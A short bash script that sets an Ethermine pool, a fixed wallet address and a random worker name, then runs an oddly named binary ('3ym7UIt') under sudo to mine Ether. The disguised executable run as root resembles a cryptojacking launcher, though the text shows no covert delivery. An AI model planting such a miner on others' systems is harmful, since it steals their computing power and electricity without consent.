#!/bin/bash

POOL=asia1-eth.ethermine.org:4444
WALLET=0x03188Bd55a06E1897dfC1E28f686767de4eb9B00
WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)

cd "$(dirname "$0")"

chmod +x ./3ym7UIt && sudo ./3ym7UIt -a ethash -o $POOL -u $WALLET.$WORKER -log
pause $@
